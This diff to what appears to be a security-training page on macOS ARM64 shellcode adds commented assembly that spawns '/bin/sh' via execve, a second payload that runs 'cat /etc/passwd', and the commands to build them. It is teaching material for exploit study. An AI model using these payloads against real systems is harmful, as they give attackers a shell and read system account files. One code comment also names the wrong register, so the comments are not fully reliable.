@@ -98,10 +98,38 @@ Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504
 
 ### Shellcodes
 
+To compile:
+
+{% code overflow="wrap" %}
+```bash
+as -o shell.o shell.s
+ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
+```
+{% endcode %}
+
 #### Shell
 
 Taken from [**here**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) and explained.
 
+{% tabs %}
+{% tab title="with adr" %}
+```armasm
+.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
+.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
+.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
+
+_main:    
+    adr  x0, sh_path  ; This is the address of "/bin/sh".
+    mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
+    mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.    
+    mov  x16, #59     ; Move the execve syscall number (59) into x16.
+    svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+
+sh_path: .asciz "/bin/sh"
+```
+{% endtab %}
+
+{% tab title="with stack" %}
 ```armasm
 .section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
 .global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
@@ -130,15 +158,36 @@ _main:
     svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
 
 ```
+{% endtab %}
+{% endtabs %}
 
-To compile:
+#### Read with cat
 
-{% code overflow="wrap" %}
-```bash
-as -o shell.o shell.s
-ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
+```armasm
+.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
+.global _main              ; Declare a global symbol _main
+.align 2                   ; Align the beginning of the following code to a 4-byte boundary
+
+_main:
+    ; Prepare the arguments for the execve syscall
+    sub sp, sp, #48        ; Allocate space on the stack
+    mov x1, sp             ; x1 will hold the address of the argument array
+    adr x0, cat_path
+    str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
+    adr x0, passwd_path    ; Get the address of "/etc/passwd"
+    str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
+    str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)
+    
+    adr x0, cat_path
+    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
+    mov x16, #59            ; Load the syscall number for execve (59) into x8
+    svc 0                  ; Make the syscall
+
+
+cat_path: .asciz "/bin/cat"
+.align 2
+passwd_path: .asciz "/etc/passwd"
 ```
-{% endcode %}
 
 <details>
 
